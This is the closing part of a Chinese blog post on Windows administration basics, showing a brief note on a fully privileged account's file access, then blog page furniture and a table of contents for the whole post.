+<p>切换到c账户，可以随意上传、下载、删除里面的文件了，因为c账户具有完全控制权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140215331.png" alt="image-20220614021556183"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140216576.png" alt="image-20220614021616454"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">YQQ</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://jason177.com/2022/05/12/windows/">https://jason177.com/2022/05/12/windows/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://jason177.com" target="_blank">Jughead YQQ</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Windows/">Windows</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/xssqg/image/202206151611273.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/xssqg/image/202109261620173.jpg" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/xssqg/image/202109261620173.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/xssqg/image/202109261624241.jpg" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/xssqg/image/202109261624241.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/03/20/helpby/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/xssqg/image/202203201445517.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">轻量的数据脱敏工具</div></div></a></div><div class="next-post pull-right"><a href="/2022/05/25/linuxthree/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040526746.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Linux三剑客的基础学习</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/xssqg/image/1.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Jughead YQQ</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://weibo.com/u/5263814707"><i class="fab fa-weibo"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xssqg" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:xssqg7571@gmail.com" target="_blank" title="Gmail"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://t.me/xssqg" target="_blank" title="Telegram"><i class="fab fa-telegram"></i></a><a class="social-icon" href="https://twitter.com/757172041" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a><a class="social-icon" href="https://www.facebook.com/JudheadYQQ/" target="_blank" title="FB"><i class="fab fa-facebook"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">在文章下面或者留言板可以发表评论喔，记得把邮箱留下来，这样我就可以回复你啦(交个朋友就行了，我是菜鸡，你问问题我也不会回你)请文明发言喔！！也可以关注我的其它社交软件私聊我</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#windows2003%E8%93%9D%E5%B1%8F%E7%82%B8%E5%BC%B9"><span class="toc-number">1.</span> <span class="toc-text">windows2003蓝屏炸弹</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DOS%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">DOS基础命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#fsutil"><span class="toc-number">2.1.</span> <span class="toc-text">fsutil</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#md"><span class="toc-number">2.2.</span> <span class="toc-text">md</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rd"><span class="toc-number">2.3.</span> <span class="toc-text">rd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#echo"><span class="toc-number">2.4.</span> <span class="toc-text">echo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#taskkill"><span class="toc-number">2.5.</span> <span class="toc-text">taskkill</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ping"><span class="toc-number">2.6.</span> <span class="toc-text">ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#type"><span class="toc-number">2.7.</span> <span class="toc-text">type</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#del"><span class="toc-number">2.8.</span> <span class="toc-text">del</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gt-gt"><span class="toc-number">2.9.</span> <span class="toc-text">&gt;&gt;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nul"><span class="toc-number">2.10.</span> <span class="toc-text">nul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ren"><span class="toc-number">2.11.</span> <span class="toc-text">ren</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#attrib"><span class="toc-number">2.12.</span> <span class="toc-text">attrib</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shutdown"><span class="toc-number">2.13.</span> <span class="toc-text">shutdown</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#title"><span class="toc-number">2.14.</span> <span class="toc-text">title</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#assoc"><span class="toc-number">2.15.</span> <span class="toc-text">assoc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#set"><span class="toc-number">2.16.</span> <span class="toc-text">set</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%98%BE%E7%A4%BA%E5%BD%93%E5%89%8D%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%BB%A5%E5%8F%8A%E5%80%BC"><span class="toc-number">2.16.1.</span> <span class="toc-text">1.显示当前环境变量以及值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%98%BE%E7%A4%BA%E4%BB%A5str%E5%BC%80%E5%A4%B4%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%BB%A5%E5%8F%8A%E5%80%BC"><span class="toc-number">2.16.2.</span> <span class="toc-text">2.显示以str开头的环境变量以及值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%AE%BE%E7%BD%AE-%E4%BF%AE%E6%94%B9-%E6%B8%85%E7%A9%BA%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">2.16.3.</span> <span class="toc-text">3.设置&#x2F;修改&#x2F;清空环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-p"><span class="toc-number">2.16.4.</span> <span class="toc-text">4.&#x2F;p</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bat%E6%89%B9%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC"><span class="toc-number">3.</span> <span class="toc-text">bat批处理脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%85%E7%90%86%E8%84%9A%E6%9C%AC"><span class="toc-number">3.1.</span> <span class="toc-text">清理脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E7%B3%BB%E7%BB%9F%E8%84%9A%E6%9C%AC"><span class="toc-number">3.2.</span> <span class="toc-text">删除系统脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E6%9C%BA%E8%84%9A%E6%9C%AC"><span class="toc-number">3.3.</span> <span class="toc-text">关机脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E9%99%90%E5%85%B3%E6%9C%BA%E8%84%9A%E6%9C%AC"><span class="toc-number">3.4.</span> <span class="toc-text">无限关机脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%A0%E7%94%A8%E8%B5%84%E6%BA%90%E8%84%9A%E6%9C%AC"><span class="toc-number">3.5.</span> <span class="toc-text">占用资源脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%85%B3%E8%81%94%E6%80%A7%E8%84%9A%E6%9C%AC"><span class="toc-number">3.6.</span> <span class="toc-text">修改关联性脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%E8%84%9A%E6%9C%AC"><span class="toc-number">3.7.</span> <span class="toc-text">创建用户脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#vbs"><span class="toc-number">4.</span> <span class="toc-text">vbs</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86"><span class="toc-number">5.</span> <span class="toc-text">用户管理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-0-%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%90%E8%A1%8Ccmd"><span class="toc-number">5.1.</span> <span class="toc-text">1.0 管理员运行cmd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-%E7%94%A8%E6%88%B7%E6%A6%82%E8%BF%B0"><span class="toc-number">5.2.</span> <span class="toc-text">1.1 用户概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7"><span class="toc-number">5.3.</span> <span class="toc-text">1.2 内置用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">5.4.</span> <span class="toc-text">1.3 配置文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4"><span class="toc-number">5.5.</span> <span class="toc-text">1.4 用户管理命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-5-%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5-RDP"><span class="toc-number">5.6.</span> <span class="toc-text">1.5 远程桌面连接(RDP)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%84%E7%AE%A1%E7%90%86"><span class="toc-number">6.</span> <span class="toc-text">组管理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1%E7%BB%84%E6%A6%82%E8%BF%B0"><span class="toc-number">6.1.</span> <span class="toc-text">2.1组概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2%E5%86%85%E7%BD%AE%E7%BB%84"><span class="toc-number">6.2.</span> <span class="toc-text">2.2内置组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3%E5%88%9B%E5%BB%BA%E7%BB%84-%E5%8A%A0%E5%85%A5%E7%94%A8%E6%88%B7"><span class="toc-number">6.3.</span> <span class="toc-text">2.3创建组&#x2F;加入用户</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E5%BD%A2%E5%8C%96%E6%B7%BB%E5%8A%A0"><span class="toc-number">6.3.1.</span> <span class="toc-text">图形化添加</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%B7%BB%E5%8A%A0"><span class="toc-number">6.3.2.</span> <span class="toc-text">命令行添加</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%8B%E4%BA%88%E6%9D%83%E9%99%90"><span class="toc-number">6.3.3.</span> <span class="toc-text">赋予权限</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shift%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.</span> <span class="toc-text">Shift漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%92%8Cgoto"><span class="toc-number">8.</span> <span class="toc-text">:和goto</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PE%E7%B3%BB%E7%BB%9F%E7%A0%B4%E8%A7%A3windows%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81"><span class="toc-number">9.</span> <span class="toc-text">PE系统破解windows登录密码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%89%E7%9B%98"><span class="toc-number">9.1.</span> <span class="toc-text">光盘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#U%E7%9B%98"><span class="toc-number">9.2.</span> <span class="toc-text">U盘</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NTFS%E6%9D%83%E9%99%90%E6%A6%82%E8%BF%B0"><span class="toc-number">10.</span> <span class="toc-text">NTFS权限概述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NTFS%E7%89%B9%E7%82%B9"><span class="toc-number">10.1.</span> <span class="toc-text">NTFS特点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9NTFS%E6%9D%83%E9%99%90"><span class="toc-number">10.2.</span> <span class="toc-text">修改NTFS权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%B4%AF%E5%8A%A0"><span class="toc-number">10.3.</span> <span class="toc-text">权限累加</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%96%E5%BE%97%E6%89%80%E6%9C%89%E6%9D%83"><span class="toc-number">10.4.</span> <span class="toc-text">取得所有权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%8D%E5%88%B6%E5%AF%B9%E6%9D%83%E9%99%90%E7%9A%84%E5%BD%B1%E5%93%8D"><span class="toc-number">10.5.</span> <span class="toc-text">文件复制对权限的影响</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1-SMB"><span class="toc-number">11.</span> <span class="toc-text">文件共享服务(SMB)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A6%82%E8%BF%B0"><span class="toc-number">11.1.</span> <span class="toc-text">1.共享服务器概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB"><span class="toc-number">11.2.</span> <span class="toc-text">2.创建共享</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-number">11.3.</span> <span class="toc-text">3.创建隐藏共享文件夹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-net-share"><span class="toc-number">11.4.</span> <span class="toc-text">4.net share</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%B1%8F%E8%94%BD%E7%B3%BB%E7%BB%9F%E5%85%B1%E4%BA%AB"><span class="toc-number">11.5.</span> <span class="toc-text">5.屏蔽系统共享</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E5%85%B3%E9%97%AD445%E6%9C%8D%E5%8A%A1"><span class="toc-number">11.6.</span> <span class="toc-text">6.关闭445服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-number">11.6.1.</span> <span class="toc-text">方法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-number">11.6.2.</span> <span class="toc-text">方法2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-ipc%E6%A4%8D%E5%85%A5%E6%9C%A8%E9%A9%AC"><span class="toc-number">11.7.</span> <span class="toc-text">7.ipc植入木马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#net-use"><span class="toc-number">11.7.1.</span> <span class="toc-text">net use</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#at"><span class="toc-number">11.7.2.</span> <span class="toc-text">at</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Telnet%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86"><span class="toc-number">12.</span> <span class="toc-text">Telnet服务器远程管理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E7%B1%BB%E5%9E%8B"><span class="toc-number">12.1.</span> <span class="toc-text">1.远程管理类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Telnet%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="toc-number">12.2.</span> <span class="toc-text">2.Telnet远程连接</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DHCP%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%AE%89%E5%85%A8"><span class="toc-number">13.</span> <span class="toc-text">DHCP部署与安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-DHCP%E4%BD%9C%E7%94%A8"><span class="toc-number">13.1.</span> <span class="toc-text">1.DHCP作用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-DHCP%E4%BC%98%E7%82%B9"><span class="toc-number">13.2.</span> <span class="toc-text">2.DHCP优点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-DHCP%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5"><span class="toc-number">13.3.</span> <span class="toc-text">3.DHCP相关概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-DHCP%E5%8E%9F%E7%90%86"><span class="toc-number">13.4.</span> <span class="toc-text">4.DHCP原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%89%E5%AE%A2%E6%88%B7%E6%9C%BA%E5%8F%91%E9%80%81DHCP-Discovery%E5%B9%BF%E6%92%AD%E5%8C%85"><span class="toc-number">13.4.1.</span> <span class="toc-text">1）客户机发送DHCP Discovery广播包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%89%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%93%8D%E5%BA%94DHCP-Offer%E5%B9%BF%E6%92%AD%E5%8C%85"><span class="toc-number">13.4.2.</span> <span class="toc-text">2）服务器响应DHCP Offer广播包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%EF%BC%89%E5%AE%A2%E6%88%B7%E6%9C%BA%E5%8F%91%E9%80%81DHCP-Request%E5%B9%BF%E6%92%AD%E5%8C%85"><span class="toc-number">13.4.3.</span> <span class="toc-text">3）客户机发送DHCP Request广播包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%EF%BC%89%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%91%E9%80%81DHCP-ACK%E5%B9%BF%E6%92%AD%E5%8C%85"><span class="toc-number">13.4.4.</span> <span class="toc-text">4）服务器发送DHCP ACK广播包</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-DHCP%E7%BB%AD%E7%BA%A6"><span class="toc-number">13.5.</span> <span class="toc-text">5.DHCP续约</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E9%83%A8%E7%BD%B2DHCP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%AD%A5%E9%AA%A4"><span class="toc-number">13.6.</span> <span class="toc-text">6.部署DHCP服务器步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E5%9C%B0%E5%9D%80%E4%BF%9D%E7%95%99"><span class="toc-number">13.7.</span> <span class="toc-text">7.地址保留</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-DHCP%E6%94%BB%E5%87%BB"><span class="toc-number">13.8.</span> <span class="toc-text">8.DHCP攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DNS%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%AE%89%E5%85%A8"><span class="toc-number">14.</span> <span class="toc-text">DNS部署与安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-DNS"><span class="toc-number">14.1.</span> <span class="toc-text">1.DNS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%9F%9F%E5%90%8D%E7%BB%84%E6%88%90"><span class="toc-number">14.2.</span> <span class="toc-text">2.域名组成</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%89%E5%9F%9F%E5%90%8D%E7%BB%84%E6%88%90%E6%A6%82%E8%BF%B0"><span class="toc-number">14.2.1.</span> <span class="toc-text">1）域名组成概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%89%E5%9F%9F%E5%90%8D%E7%BB%84%E6%88%90"><span class="toc-number">14.2.2.</span> <span class="toc-text">2）域名组成</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3"><span class="toc-number">14.3.</span> <span class="toc-text">3.监听端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-DNS%E8%A7%A3%E6%9E%90%E7%A7%8D%E7%B1%BB"><span class="toc-number">14.4.</span> <span class="toc-text">4.DNS解析种类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%89%E6%8C%89%E7%85%A7%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%88%86%E7%B1%BB%EF%BC%9A"><span class="toc-number">14.4.1.</span> <span class="toc-text">1）按照查询方式分类：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%89%E6%8C%89%E7%85%A7%E6%9F%A5%E8%AF%A2%E5%86%85%E5%AE%B9%E5%88%86%E7%B1%BB%EF%BC%9A"><span class="toc-number">14.4.2.</span> <span class="toc-text">2）按照查询内容分类：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B"><span class="toc-number">14.5.</span> <span class="toc-text">5.DNS服务器搭建过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%89%E8%A6%81%E6%B1%82%E7%BD%91%E5%8D%A1IP%E6%98%AF%E9%9D%99%E6%80%81IP%E5%9C%B0%E5%9D%80"><span class="toc-number">14.5.1.</span> <span class="toc-text">1）要求网卡IP是静态IP地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%89%E5%AE%89%E8%A3%85DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8F%92%E4%BB%B6"><span class="toc-number">14.5.2.</span> <span class="toc-text">2）安装DNS服务器插件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%EF%BC%89%E6%AD%A3%E5%90%91%E5%8C%BA%E5%9F%9F%E5%88%9B%E5%BB%BA%E5%8C%BA%E5%9F%9F%E6%96%87%E4%BB%B6"><span class="toc-number">14.5.3.</span> <span class="toc-text">3）正向区域创建区域文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%EF%BC%89%E6%96%B0%E5%BB%BAA%E8%AE%B0%E5%BD%95"><span class="toc-number">14.5.4.</span> <span class="toc-text">4）新建A记录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%EF%BC%89%E5%8F%8D%E5%90%91%E5%8C%BA%E5%9F%9F%E5%88%9B%E5%BB%BA%E5%8C%BA%E5%9F%9F%E6%96%87%E4%BB%B6"><span class="toc-number">14.5.5.</span> <span class="toc-text">5）反向区域创建区域文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%EF%BC%89DNS%E8%BD%AC%E5%8F%91%E5%99%A8"><span class="toc-number">14.5.6.</span> <span class="toc-text">6）DNS转发器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-DNS%E5%AE%A2%E6%88%B7%E6%9C%BA%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90"><span class="toc-number">14.6.</span> <span class="toc-text">6.DNS客户机如何解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%A4%84%E7%90%86%E5%9F%9F%E5%90%8D%E8%AF%B7%E6%B1%82%E7%9A%84%E9%A1%BA%E5%BA%8F"><span class="toc-number">14.7.</span> <span class="toc-text">7.DNS服务器处理域名请求的顺序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E5%AE%A2%E6%88%B7%E6%9C%BA%E4%B8%8A%E6%B8%85%E9%99%A4%E7%BC%93%E5%AD%98"><span class="toc-number">14.8.</span> <span class="toc-text">8.客户机上清除缓存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95%E7%B1%BB%E5%9E%8B"><span class="toc-number">14.9.</span> <span class="toc-text">9.域名解析记录类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-%E5%AE%A2%E6%88%B7%E6%9C%BA%E5%9F%9F%E5%90%8D%E8%AF%B7%E6%B1%82%E8%A7%A3%E6%9E%90%E9%A1%BA%E5%BA%8F"><span class="toc-number">14.10.</span> <span class="toc-text">10.客户机域名请求解析顺序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AF%B9%E5%9F%9F%E5%90%8D%E8%AF%B7%E6%B1%82%E7%9A%84%E5%A4%84%E7%90%86%E9%A1%BA%E5%BA%8F"><span class="toc-number">14.11.</span> <span class="toc-text">11.服务器对域名请求的处理顺序</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">15.</span> <span class="toc-text">WEB服务器</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2WEB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">15.1.</span> <span class="toc-text">部署WEB服务器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%89%E5%AE%89%E8%A3%85IIS"><span class="toc-number">15.1.1.</span> <span class="toc-text">1）安装IIS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%89%E9%BB%98%E8%AE%A4%E7%BD%91%E7%AB%99"><span class="toc-number">15.1.2.</span> <span class="toc-text">2）默认网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%EF%BC%89%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%991"><span class="toc-number">15.1.3.</span> <span class="toc-text">3）制作网站1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%EF%BC%89%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%992"><span class="toc-number">15.1.4.</span> <span class="toc-text">4）制作网站2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E7%AB%AF%E5%8F%A3"><span class="toc-number">15.1.4.1.</span> <span class="toc-text">不同端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E5%9F%9F%E5%90%8D"><span class="toc-number">15.1.4.2.</span> <span 